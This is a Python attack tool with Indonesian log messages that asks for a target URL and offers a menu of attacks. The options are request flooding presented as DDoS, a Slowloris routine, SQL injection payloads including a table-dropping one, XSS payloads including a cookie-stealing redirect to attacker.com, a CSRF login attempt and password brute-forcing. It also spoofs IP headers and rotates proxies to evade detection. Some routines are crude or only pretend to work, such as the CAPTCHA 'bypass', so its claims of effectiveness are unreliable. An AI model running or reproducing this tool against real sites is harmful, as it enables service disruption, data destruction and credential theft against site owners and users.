import requests
import random
import string
import logging
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import base64
import os
import itertools

R = '\033[91m'  # Red
G = '\033[92m'  # Green
Y = '\033[93m'  # Yellow
B = '\033[94m'  # Blue
M = '\033[95m'  # Magenta
C = '\033[96m'  # Cyan
N = '\033[0m'   # Reset

print(f"""{G}
-------------------------{R}######{G}-------------------------
---------------------{R}######{G}--{R}######{G}---------------------
------------------{R}###{G}--------------{R}###{G}------------------
---------------{R}####{G}------------------{R}####{G}---------------
--------------{R}#{G}-{R}#{G}--------------------{R}#{G}-{R}#{G}-{R}#{G}--------------
--------------{R}##{G}------------------------{R}##{G}--------------
-------------{R}#{G}----------------------------{R}#{G}-------------
------------{R}#{G}-------------{R}####{G}-------------{R}#{G}------------
-------------------------{R}######{G}-------------------------
-----------{R}#{G}--------{R}##{G}----{R}####{G}----{R}##{G}--------{R}#{G}-----------
----------{R}#{G}-------{R}######{G}---{R}##{G}---{R}######{G}-------{R}#{G}----------
---------{R}#{G}-----------------{R}##{G}----------------{R}##{G}---------
--------{R}#{G}--------{R}######################{G}-------{R}##{G}--------
-----------------{R}######################{G}-----------------
-------{R}#{G}--------------{R}##{G}---{R}##{G}---{R}##{G}--------------{R}#{G}-------
------------------{R}#{G}---{R}###{G}------{R}###{G}---{R}#{G}------------------
--------{R}#{G}----------{R}#{G}-------{R}##{G}-------{R}#{G}----------{R}#{G}--------
---------{R}#{G}----------{R}##{G}-{R}####{G}--{R}#######{G}----------{R}#{G}---------
------------{R}#{G}---------{R}#####{G}--{R}#####{G}---------{R}#{G}------------
----------{R}#{G}-------------{R}###{G}--{R}###{G}-------------{R}#{G}----------
-----------{R}##{G}------------------------------{R}##{G}-----------
-------{R}#####{G}--------------------------------{R}#####{G}-------
----{R}###{G}-{R}#{G}--------------------------------------{R}#{G}-{R}###{G}----
--------------------------------------------------------
--------------------------------------------------------
----------------------{R}#{G}----------{R}#{G}----------------------
----------------------{R}#{G}----------{R}#{G}----------------------
---------------------------------{R}#{G}----------------------""")
print("Printing banner...")
print(f"{R}                                                                                   {N}")
print(f"{R} ,-----.         ,--.                 ,--.                                         {N}")
print(f"{Y}'  .--./,--. ,--.|  |-.  ,---. ,--.--.|  ,---.  ,---. ,--.--. ,---.  ,---.  ,---.  {N}")
print(f"{G}|  |     \\  '  /| .-. '| .-. :|  .--'|  .-.  || .-. :|  .--' | .-. || .-. (  .-'  {N}")
print(f"{C}'  '--'\\  \\   '| `-'  \\  --.|  |   |  | |  |\\  --.|  |    ' '-' \\ `---..-'  `) {N}")
print(f"{M} `-----'.-'  /    `---'  `----'`--'   `--' `--' `----'`--'    `---'  `----'`----'  {N}")
print(f"{Y}        `---'                                                                       {N}")
print("Banner printed.")  

logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/92.0',
    'Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
]

PROXIES = [
    {"http": "http://proxy1.example.com:8080", "https": "http://proxy1.example.com:8080"},
    {"http": "http://proxy2.example.com:8080", "https": "http://proxy2.example.com:8080"},
]

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def random_delay(min_delay=1, max_delay=3):
    time.sleep(random.randint(min_delay, max_delay))

def create_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': get_random_user_agent(),
        'Referer': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
    })
    return session

def send_request(url, session, proxy=None):
    try:
        response = session.get(url, proxies=proxy, timeout=5)
        logging.info(f"Request berhasil dikirim ke {url} | Status: {response.status_code}")
        return response
    except requests.exceptions.RequestException as e:
        logging.error(f"Request gagal: {e}")
        return None

def flood_target(url, session, number_of_requests):
    for _ in range(number_of_requests):
        try:
            response = send_request(url, session, proxy=get_random_proxy())
            if response and response.status_code >= 500:
                logging.info("Target mungkin mengalami kegagalan: Server error 5xx")
        except Exception as e:
            logging.error(f"Request gagal: {e}")

def slowloris_attack(url, session, timeout=100):
    headers = {
        'User-Agent': get_random_user_agent(),
        'Connection': 'keep-alive',
        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
    }
    try:
        with requests.get(url, headers=headers, proxies=get_random_proxy(), stream=True, timeout=timeout) as response:
            logging.info("Slowloris Attack berjalan...")
            time.sleep(timeout)
            logging.info("Slowloris Attack selesai.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Slowloris gagal: {e}")

def sql_injection(url, session):
    payloads = [
        "' OR 1=1 --",
        "' UNION SELECT null, username, password FROM users --",
        "' AND SLEEP(5) --",
        "' OR 1=1 LIMIT 1 --",
        "' AND 1=1 UNION SELECT username, password FROM users --",
        "'; DROP TABLE users --"
    ]
    for payload in payloads:
        response = send_request(url + payload, session)
        if response and "error" in response.text.lower():
            logging.info(f"Potensi celah SQL Injection ditemukan dengan payload: {payload}")

def xss_attack(url, session):
    payloads = [
        "<script>alert('XSS');</script>",
        "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "<script>document.location='http://attacker.com?cookie='+document.cookie</script>"
    ]
    for payload in payloads:
        response = send_request(url + payload, session)
        if response and payload in response.text:
            logging.info(f"Potensi celah XSS ditemukan dengan payload: {payload}")

def csrf_attack(url, session):
    response = send_request(url, session)
    if response and 'csrf_token' in response.text:
        csrf_token = response.text.split('csrf_token" value="')[1].split('"')[0]
        logging.info(f"Token CSRF ditemukan: {csrf_token}")
        data = {
            'username': 'attacker',
            'password': 'password123',
            'csrf_token': csrf_token,
        }
        response = session.post(url, data=data)
        if response.status_code == 200:
            logging.info(f"Potensi CSRF berhasil dilakukan pada {url}")
        else:
            logging.info(f"CSRF gagal pada {url}")

def captcha_bypass(url, session):
    logging.info(f"Mencoba bypass CAPTCHA di {url}")
    response = send_request(url, session)
    if response and "captcha" in response.text.lower():
        logging.info("Potensi bypass CAPTCHA ditemukan!")

def brute_force_login(url, session, user_list, pass_list):
    for user, password in itertools.product(user_list, pass_list):
        data = {'username': user, 'password': password}
        response = session.post(url, data=data)
        if response.status_code == 200 and "login successful" in response.text.lower():
            logging.info(f"Brute-force berhasil dengan user: {user} dan password: {password}")
            break

def main():
    url = input("Masukkan URL target: ")
    session = create_session()
    logging.info(f"Mulai melakukan serangan pada {url}")

    while True:
        print(f"{Y}Pilih jenis serangan:{N}")
        print(f"{R}1{G}. Flooding (DDoS)")
        print(f"{R}2{G}. Slowloris")
        print(f"{R}3{G}. SQL Injection")
        print(f"{R}4{G}. XSS ")
        print(f"{R}5{G}. CSRF ")
        print(f"{R}6{G}. CAPTCHA Bypass")
        print(f"{R}7{G}. Brute Force Login")
        print("0. Keluar")
        
        choice = input("Pilih opsi: ")

        if choice == "1":
            flood_target(url, session, 100)
        elif choice == "2":
            slowloris_attack(url, session)
        elif choice == "3":
            sql_injection(url, session)
        elif choice == "4":
            xss_attack(url, session)
        elif choice == "5":
            csrf_attack(url, session)
        elif choice == "6":
            captcha_bypass(url, session)
        elif choice == "7":
            users = ["admin", "user", "guest"]
            passwords = ["password123", "12345", "admin123"]
            brute_force_login(url, session, users, passwords)
        elif choice == "0":
            print("Keluar dari program...")
            break
        else:
            print(f"{R}Pilihan tidak valid!{N}")

if __name__ == "__main__":
    main()
